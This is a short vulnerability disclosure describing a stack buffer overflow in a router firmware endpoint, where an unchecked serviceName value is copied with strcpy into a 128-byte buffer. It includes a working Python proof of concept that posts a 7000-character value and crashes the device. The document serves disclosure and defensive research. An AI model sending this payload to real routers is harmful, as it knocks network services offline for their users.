## Vulnerability cause

In the function sub_65A28, the serviceName value is obtained from user-controlled input via v2 = (const char *)sub_295C8(a1, "serviceName", &unk_1C2CF0) and then copied into the local buffer v5 using strcpy(v5, v2). The buffer v5 is a fixed-size stack buffer of 128 bytes (char v5[128]), while strcpy does not perform any bounds checking on the source string. Because the "serviceName" parameter can be supplied by the user without any enforced maximum length, an attacker can provide an excessively long value to cause strcpy to write past the end of v5. This results in a stack-based buffer overflow that can corrupt adjacent stack memory and lead to a process crash, causing a Denial of Service condition.

## PoC

In order to reproduce the vulnerability, the following steps can be followed:

1.Boot the firmware by qemu-system or other ways (real machine)

2.Attack with the following POC attacks


```
import requests

url = "http://192.168.20.12/goform/AdvSetMacMtuWan"

serviceName = "A"*7000
data = {
"serviceName": serviceName
}

r = requests.post(url, data=data)
print(r.status_code, r.text)
```


## Result

The target router crashes and cannot provide services correctly and persistently.
